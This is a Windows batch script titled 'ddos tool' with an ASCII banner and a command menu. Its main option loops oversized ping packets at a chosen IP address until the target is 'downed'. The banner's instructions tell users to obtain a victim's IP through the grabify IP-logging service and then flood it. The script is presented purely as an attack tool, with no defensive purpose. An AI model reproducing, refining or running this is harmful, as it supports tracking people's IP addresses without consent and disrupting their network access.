@Echo off
chcp 650000
cls
color 4
title ddos tool
:start
echo      **      **                      **                      **
echo     /**     /**                     /**                     /**
echo     /**     /**  ******   ******   ******  ******   ******  /**
echo  ******  ****** **////** **////   ///**/  **////** **////** /**
echo **///** **///**/**   /**//*****     /**  /**   /**/**   /** /**
echo/**  /**/**  /**/**   /** /////**    /**  /**   /**/**   /** /**
echo//******//******//******  ******     //** //****** //******  ***
echo //////  //////  //////  //////       //   //////   //////  /// 
echo.
echo -----------------------------------------------------------------------------
echo -        MADE BY WIL#2184          -           INFO FOR THE TOOLS           -
echo -      CTRL+C TO STOP PINGING      -  'ping'= ddos tool, what you came for  -
echo ------------------------------------      'stpip'= turns off your wifi      -
echo -    IF YOU GET A ERROR ON FIRST   -      'grab'= redirect to grabify       -
echo -    LINE THEN THE IP ISNT VALID   -       'fidip'= find your own ip        -
echo -     OR THE ROUTER IS OFFLINE     - 'ipinfo'= a tool to get info from an ip-
echo ------------------------------------       TYPE THESE CODES INTO THE INPUT  -
echo -    USE WWW.GRABIFY.COM TO GRAB   -            BAR TO USE EACH TOOL        -
echo -   TO GRAB AN IP THEN USE THE IP  -
echo -    INTO THIS TOOL TO DDOS THEM   -
echo ------------------------------------
echo -     when selecting bytes use     -
echo -    64-1250. for fast and strong  -
echo -      for slow and strong use     -
echo -        65535, its the max.       -
echo ------------------------------------
echo -      msg me on disc for help     -
echo -   on making it better, wil%2184  -
echo.
:codeen
set /p org= enter the tool you want to use here:
if %org%==ping goto ping
if %org%==grab goto grab
if %org%==ipinfo goto ipinfo
if %org%==fidip goto fidip
if %org%==stpip goto stpip
:ping
set /p IP=Enter IP:
set /p bytes=Enter BYTES:
:top
PING -n 1 -l %bytes% %IP% | FIND "TTL="
PING -n 1 -l %bytes% %IP% | FIND "TTL="
PING -n 1 -l %bytes% %IP% | FIND "TTL="
PING -n 1 -l %bytes% %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=0b & echo Downed, or its broke.) 
ping -t 2 0 10 127.0.0.1 >nul
GoTo top 
:grab
start www.grabify.link/
GoTo start
:ipinfo
start www.ipinfo.io/
GoTo start
:fidip
start www.whatsmyip.org
GoTo start
:stpip
set /p time=how long to timeout your wifi(in seconds):
ipconfig /release 
timeout %time% 
ipconfig /renew
GoTo start 
